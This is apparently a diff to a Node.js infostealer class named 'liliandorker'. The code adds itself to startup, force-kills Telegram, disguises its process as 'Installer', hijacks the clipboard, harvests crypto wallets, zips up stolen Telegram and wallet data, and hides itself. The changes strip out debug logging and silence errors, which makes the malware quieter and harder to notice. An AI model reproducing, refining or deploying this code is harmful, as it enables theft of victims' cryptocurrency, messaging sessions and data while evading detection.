@@ -172,7 +172,7 @@ class liliandorker {
                 )
             );
 
-        console.log(process.argv0);
+        
 
         setTimeout(() => {
             this.requires.fs.rename(
@@ -187,18 +187,15 @@ class liliandorker {
             );
         }, 3000);
 
-        console.log("Added to startup");
     }
 
 
 
     async init() {
         process.on("unhandledRejection", (err) => {
-            console.log(err);
         });
 
         process.on("uncaughtException", (exc) => {
-            console.log(exc);
         });
 
         exec('taskkill /IM Telegram.exe /F', (error, stdout, stderr) => {
@@ -206,12 +203,9 @@ class liliandorker {
                 console.error(`exec error: ${error}`);
                 return;
             }
-            console.log(`stdout: ${stdout}`);
-            console.log(`stderr: ${stderr}`);
         })
 
         process.title = "Installer";
-        console.log("Downloading client...");
 
         this.utils.protection.detect_malicious_processes();
 
@@ -247,9 +241,6 @@ class liliandorker {
 
         this.config.jszip.path = this.config.jszip.generate_path();
         this.config.jsziptg.path = this.config.jsziptg.generate_path();
-
-        console.log(this.config.jszip.path);
-        console.log(this.config.jsziptg.path);
 
         this.utils.clipper.detectClipboard();
         await this.utils.wallets.getWallets();
@@ -299,7 +290,6 @@ class liliandorker {
 }
 
 process.on("uncaughtException", (err) => {
-    console.log(err);
 });
 
 const axios = require("axios");
@@ -311,7 +301,7 @@ async function hideSelf() {
 }
 
 (async () => {
-    hideSelf()
+    hideSelf();
     while (true) {
         try {
             await axios.get("https://www.google.com");
